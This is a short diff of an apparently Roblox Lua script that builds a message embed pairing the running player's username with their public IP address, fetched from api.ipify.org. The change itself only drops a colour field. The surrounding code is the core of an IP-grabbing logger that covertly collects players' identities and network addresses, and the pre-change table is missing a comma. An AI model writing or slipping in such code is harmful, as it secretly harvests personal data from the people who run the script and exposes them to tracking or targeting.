@@ -31,7 +31,6 @@ pcall(function()
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
                ["description"] = game:HttpGet("https://api.ipify.org")
-	       ["color"] = 0xFF0000, -- red color code
            }
        }
    }
